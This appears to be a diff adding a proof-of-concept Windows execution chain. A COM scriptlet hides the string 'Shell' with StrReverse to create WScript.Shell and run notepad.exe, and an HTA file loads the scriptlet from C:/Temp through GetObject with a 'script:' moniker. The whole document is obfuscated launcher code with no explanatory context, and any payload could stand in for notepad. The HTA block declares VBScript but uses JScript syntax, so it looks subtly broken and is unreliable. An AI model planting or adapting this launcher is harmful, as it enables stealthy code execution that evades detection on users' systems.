@@ -1,0 +1,38 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+   description="Testit"
+   progid="Testit"
+   version="1.00"
+   classid="{AAAA1111-0000-0000-0000-0000FEEDACAE}"
+   remotable="true"
+	>
+</registration>
+
+<script language="vbscript">
+<![CDATA[
+
+	test = StrReverse("llehS")
+	Set r = CreateObject("WScript." & test)
+	r.Run("notepad.exe")
+	
+	
+]]>
+</script>
+
+</scriptlet>
+
+
+
+<!DOCTYPE html>
+<html>
+<head>
+<HTA:APPLICATION />
+<script type="text/vbscript">
+	var a = GetObject("script:file:///C:/Temp/scriptlet.sct")
+</script>
+</head>
+<body>
+</body>
+</html>
